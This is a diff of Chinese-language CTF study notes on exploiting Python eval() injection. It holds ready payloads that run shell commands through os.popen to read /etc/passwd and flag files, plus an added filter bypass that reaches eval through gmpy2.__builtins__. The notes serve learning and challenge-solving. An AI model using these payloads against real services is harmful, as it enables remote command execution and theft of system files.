@@ -6,7 +6,7 @@
 十六进制编码在Python字符串中是合法的，因为它是Python语言规范的一部分。当Python解释器读取到这样的编码时，它会将十六进制数转换成对应的字符。
 
 
-
+^
 ## **eval()函数利用**
 python报错后显示了代码：eval(a + operator + b)
 ```
@@ -17,6 +17,15 @@ python报错后显示了代码：eval(a + operator + b)
 ```
 eval(__import__('os').popen('cat /etc/passwd').read());
 eval(__import__('os').popen('cat /f*').read());
+```
+
+^
+## **eval存在过滤**
+eval(code)
+要求code存在gmpy2数组中，且正则不能存在eval
+```
+知道以下可以命令执行：
+gmpy2.__builtins__['eval']("__import__('os').popen('tac /flag').read()")
 ```
 
 
